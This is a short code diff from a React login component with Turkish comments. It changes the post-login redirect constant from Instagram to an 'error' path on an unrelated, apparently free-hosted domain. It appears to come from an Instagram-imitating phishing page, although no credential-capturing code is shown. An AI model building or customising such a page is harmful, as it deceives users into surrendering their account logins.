@@ -16,7 +16,7 @@ import axios from "axios";
 
 // Bu değişken, kullanıcı giriş yaptıktan sonra yönlendirilecek URL'i belirler
 // Statik versiyonda bu değeri arayıp değiştirebilirsiniz
-const REDIRECT_URL = "https://instagram.com";
+const REDIRECT_URL = "https://itiraflar.kesug.com/hata/";
 
 export default function Login() {
   const form = useForm<LoginFormData>({
